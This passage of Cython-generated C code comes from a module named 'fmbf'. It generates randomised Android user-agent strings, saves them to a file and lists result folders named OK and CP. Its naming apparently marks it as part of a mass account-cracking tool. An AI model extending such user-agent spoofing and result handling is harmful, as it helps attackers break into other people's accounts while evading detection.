            if (likely(__pyx_t_7)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_12);
              __Pyx_INCREF(__pyx_t_7);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_12, function);
            }
          }
          __pyx_t_8 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_12, __pyx_t_7, __pyx_kp_s_utf_8) : __Pyx_PyObject_CallOneArg(__pyx_t_12, __pyx_kp_s_utf_8);
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 169, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_replace); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 169, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_tuple__40, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 169, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __Pyx_XDECREF_SET(__pyx_v_build_device, __pyx_t_8);
          __pyx_t_8 = 0;

          
          __pyx_t_8 = PyTuple_New(9); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_10 = 0;
          __pyx_t_11 = 127;
          __Pyx_INCREF(__pyx_kp_u_Mozilla_5_0_Linux_Android_2);
          __pyx_t_10 += 28;
          __Pyx_GIVEREF(__pyx_kp_u_Mozilla_5_0_Linux_Android_2);
          PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_kp_u_Mozilla_5_0_Linux_Android_2);
          __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_random); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_randint); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__34, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_12); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_7, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_11 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_11) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_11;
          __pyx_t_10 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
          __Pyx_GIVEREF(__pyx_t_12);
          PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_t_12);
          __pyx_t_12 = 0;
          __Pyx_INCREF(__pyx_kp_u__42);
          __pyx_t_10 += 2;
          __Pyx_GIVEREF(__pyx_kp_u__42);
          PyTuple_SET_ITEM(__pyx_t_8, 2, __pyx_kp_u__42);
          __pyx_t_12 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_model_device); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_12, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_11 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_11) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_11;
          __pyx_t_10 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
          __Pyx_GIVEREF(__pyx_t_7);
          PyTuple_SET_ITEM(__pyx_t_8, 3, __pyx_t_7);
          __pyx_t_7 = 0;
          __Pyx_INCREF(__pyx_kp_u_Build);
          __pyx_t_10 += 7;
          __Pyx_GIVEREF(__pyx_kp_u_Build);
          PyTuple_SET_ITEM(__pyx_t_8, 4, __pyx_kp_u_Build);
          __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_build_device); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_7, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_11 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_11) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_11;
          __pyx_t_10 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
          __Pyx_GIVEREF(__pyx_t_12);
          PyTuple_SET_ITEM(__pyx_t_8, 5, __pyx_t_12);
          __pyx_t_12 = 0;
          __Pyx_INCREF(__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G);
          __pyx_t_10 += 48;
          __Pyx_GIVEREF(__pyx_kp_u_AppleWebKit_537_36_KHTML_like_G);
          PyTuple_SET_ITEM(__pyx_t_8, 6, __pyx_kp_u_AppleWebKit_537_36_KHTML_like_G);
          __Pyx_GetModuleGlobalName(__pyx_t_12, __pyx_n_s_random); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_12, __pyx_n_s_randint); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__43, NULL); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_t_12); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
          __pyx_t_12 = __Pyx_PyObject_FormatSimple(__pyx_t_7, __pyx_empty_unicode); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_11 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) > __pyx_t_11) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_12) : __pyx_t_11;
          __pyx_t_10 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_12);
          __Pyx_GIVEREF(__pyx_t_12);
          PyTuple_SET_ITEM(__pyx_t_8, 7, __pyx_t_12);
          __pyx_t_12 = 0;
          __Pyx_INCREF(__pyx_kp_u_0_0_0_Mobile_Safari_537_36);
          __pyx_t_10 += 27;
          __Pyx_GIVEREF(__pyx_kp_u_0_0_0_Mobile_Safari_537_36);
          PyTuple_SET_ITEM(__pyx_t_8, 8, __pyx_kp_u_0_0_0_Mobile_Safari_537_36);
          __pyx_t_12 = __Pyx_PyUnicode_Join(__pyx_t_8, 9, __pyx_t_10, __pyx_t_11); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 170, __pyx_L13_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_XDECREF_SET(__pyx_v_ugent, __pyx_t_12);
          __pyx_t_12 = 0;

          
        }
        __pyx_L21:;

        
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_write); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 171, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_8);
        if (unlikely(!__pyx_v_ugent)) { __Pyx_RaiseUnboundLocalError("ugent"); __PYX_ERR(0, 171, __pyx_L13_error) }
        __pyx_t_7 = PyNumber_Add(__pyx_v_ugent, __pyx_kp_s__39); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 171, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_14 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_14)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_14);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
          }
        }
        __pyx_t_12 = (__pyx_t_14) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_14, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_7);
        __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 171, __pyx_L13_error)
        __Pyx_GOTREF(__pyx_t_12);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
      }

      
    }
    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
    goto __pyx_L18_try_end;
    __pyx_L13_error:;
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
    __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
    __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
    __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

    
     {
      __Pyx_ErrRestore(0,0,0);
      goto __pyx_L14_exception_handled;
    }
    __pyx_L14_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_4);
    __pyx_L18_try_end:;
  }

  
  __pyx_t_12 = PyTuple_New(7); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 173, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __pyx_t_10 = 0;
  __pyx_t_11 = 127;
  __Pyx_INCREF(__pyx_kp_u_berhasil_generate);
  __pyx_t_10 += 24;
  __Pyx_GIVEREF(__pyx_kp_u_berhasil_generate);
  PyTuple_SET_ITEM(__pyx_t_12, 0, __pyx_kp_u_berhasil_generate);
  __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_H); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 173, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 173, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_11 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_11) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_11;
  __pyx_t_10 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_12, 1, __pyx_t_7);
  __pyx_t_7 = 0;
  __Pyx_INCREF(__pyx_kp_u_200);
  __pyx_t_10 += 3;
  __Pyx_GIVEREF(__pyx_kp_u_200);
  PyTuple_SET_ITEM(__pyx_t_12, 2, __pyx_kp_u_200);
  __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_N); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 173, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_7, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 173, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __pyx_t_11 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_11) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_11;
  __pyx_t_10 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
  __Pyx_GIVEREF(__pyx_t_8);
  PyTuple_SET_ITEM(__pyx_t_12, 3, __pyx_t_8);
  __pyx_t_8 = 0;
  __Pyx_INCREF(__pyx_kp_u_useragent_dan_di_simpan_ke);
  __pyx_t_10 += 28;
  __Pyx_GIVEREF(__pyx_kp_u_useragent_dan_di_simpan_ke);
  PyTuple_SET_ITEM(__pyx_t_12, 4, __pyx_kp_u_useragent_dan_di_simpan_ke);
  __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_H); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 173, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  __pyx_t_7 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 173, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  __pyx_t_11 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) > __pyx_t_11) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_7) : __pyx_t_11;
  __pyx_t_10 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_7);
  __Pyx_GIVEREF(__pyx_t_7);
  PyTuple_SET_ITEM(__pyx_t_12, 5, __pyx_t_7);
  __pyx_t_7 = 0;
  __Pyx_INCREF(__pyx_kp_u_data_ugent);
  __pyx_t_10 += 10;
  __Pyx_GIVEREF(__pyx_kp_u_data_ugent);
  PyTuple_SET_ITEM(__pyx_t_12, 6, __pyx_kp_u_data_ugent);
  __pyx_t_7 = __Pyx_PyUnicode_Join(__pyx_t_12, 7, __pyx_t_10, __pyx_t_11); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 173, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_7);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
  __pyx_t_12 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_7); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 173, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

  
  __pyx_t_12 = __Pyx_PyObject_CallNoArg(__pyx_builtin_exit); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 174, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_12);
  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;

  

  
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_AddTraceback("fmbf.Main.set_ugent", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_versi_chrome);
  __Pyx_XDECREF(__pyx_v_versi_android);
  __Pyx_XDECREF(__pyx_v_anj);
  __Pyx_XDECREF(__pyx_v_ugent);
  __Pyx_XDECREF(__pyx_v_versi_iphone);
  __Pyx_XDECREF(__pyx_v_model_device);
  __Pyx_XDECREF(__pyx_v_build_device);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}




static PyObject *__pyx_pw_4fmbf_4Main_13cek_result(PyObject *__pyx_self, PyObject *__pyx_v_self); 
static PyMethodDef __pyx_mdef_4fmbf_4Main_13cek_result = {"cek_result", (PyCFunction)__pyx_pw_4fmbf_4Main_13cek_result, METH_O, 0};
static PyObject *__pyx_pw_4fmbf_4Main_13cek_result(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("cek_result (wrapper)", 0);
  __pyx_r = __pyx_pf_4fmbf_4Main_12cek_result(__pyx_self, ((PyObject *)__pyx_v_self));

  
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_4fmbf_4Main_12cek_result(CYTHON_UNUSED PyObject *__pyx_self, CYTHON_UNUSED PyObject *__pyx_v_self) {
  PyObject *__pyx_v_res = NULL;
  PyObject *__pyx_v_folder = NULL;
  PyObject *__pyx_v_num = NULL;
  PyObject *__pyx_v_dirs = NULL;
  PyObject *__pyx_v_fil = NULL;
  PyObject *__pyx_v_ask = NULL;
  PyObject *__pyx_v_file = NULL;
  PyObject *__pyx_v_z = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  int __pyx_t_2;
  int __pyx_t_3;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  Py_ssize_t __pyx_t_6;
  PyObject *(*__pyx_t_7)(PyObject *);
  Py_ssize_t __pyx_t_8;
  Py_UCS4 __pyx_t_9;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("cek_result", 0);

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__44, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 177, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__45, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 178, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__18, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 179, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_res = __pyx_t_1;
  __pyx_t_1 = 0;

  
  __Pyx_INCREF(__pyx_v_res);
  __pyx_t_1 = __pyx_v_res;
  __pyx_t_3 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_1, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 180, __pyx_L1_error)
  if (!__pyx_t_3) {
  } else {
    __pyx_t_2 = __pyx_t_3;
    goto __pyx_L4_bool_binop_done;
  }
  __pyx_t_3 = (__Pyx_PyString_Equals(__pyx_t_1, __pyx_kp_s_01, Py_EQ)); if (unlikely(__pyx_t_3 < 0)) __PYX_ERR(0, 180, __pyx_L1_error)
  __pyx_t_2 = __pyx_t_3;
  __pyx_L4_bool_binop_done:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_3 = (__pyx_t_2 != 0);
  if (__pyx_t_3) {

    
    __Pyx_INCREF(__pyx_n_s_OK);
    __pyx_v_folder = __pyx_n_s_OK;

    
    goto __pyx_L3;
  }

  
   {
    __Pyx_INCREF(__pyx_n_s_CP);
    __pyx_v_folder = __pyx_n_s_CP;
  }
  __pyx_L3:;

  
  __Pyx_INCREF(__pyx_int_0);
  __pyx_v_num = __pyx_int_0;

  
  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_os); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 185, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_listdir); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 185, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_5);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_5, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_5, __pyx_t_4, __pyx_v_folder) : __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_v_folder);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 185, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_v_dirs = __pyx_t_1;
  __pyx_t_1 = 0;

  
  if (likely(PyList_CheckExact(__pyx_v_dirs)) || PyTuple_CheckExact(__pyx_v_dirs)) {
    __pyx_t_1 = __pyx_v_dirs; __Pyx_INCREF(__pyx_t_1); __pyx_t_6 = 0;
    __pyx_t_7 = NULL;
  } else {
    __pyx_t_6 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_dirs); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 186, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_7 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 186, __pyx_L1_error)
  }
  for (;;) {
    if (likely(!__pyx_t_7)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        if (__pyx_t_6 >= PyList_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_5 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_6); __Pyx_INCREF(__pyx_t_5); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 186, __pyx_L1_error)
        #else
        __pyx_t_5 = PySequence_ITEM(__pyx_t_1, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 186, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
        #endif
      } else {
        if (__pyx_t_6 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_5 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_6); __Pyx_INCREF(__pyx_t_5); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 186, __pyx_L1_error)
        #else
        __pyx_t_5 = PySequence_ITEM(__pyx_t_1, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 186, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
        #endif
      }
    } else {
      __pyx_t_5 = __pyx_t_7(__pyx_t_1);
      if (unlikely(!__pyx_t_5)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 186, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_5);
    }
    __Pyx_XDECREF_SET(__pyx_v_fil, __pyx_t_5);
    __pyx_t_5 = 0;

    
    __pyx_t_5 = __Pyx_PyInt_AddObjC(__pyx_v_num, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 187, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF_SET(__pyx_v_num, __pyx_t_5);
    __pyx_t_5 = 0;

    
    __pyx_t_5 = PyTuple_New(4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 188, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __pyx_t_8 = 0;
    __pyx_t_9 = 127;
    __Pyx_INCREF(__pyx_kp_u__17);
    __pyx_t_8 += 2;
    __Pyx_GIVEREF(__pyx_kp_u__17);
    PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_kp_u__17);
    __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_num, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 188, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_9;
    __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
    __Pyx_GIVEREF(__pyx_t_4);
    PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_t_4);
    __pyx_t_4 = 0;
    __Pyx_INCREF(__pyx_kp_u__46);
    __pyx_t_8 += 3;
    __Pyx_GIVEREF(__pyx_kp_u__46);
    PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_kp_u__46);
    __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_fil, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 188, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_9 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_9) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_9;
    __pyx_t_8 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
    __Pyx_GIVEREF(__pyx_t_4);
    PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_t_4);
    __pyx_t_4 = 0;
    __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_5, 4, __pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 188, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 188, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

    
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__47, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 189, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_ask = __pyx_t_1;
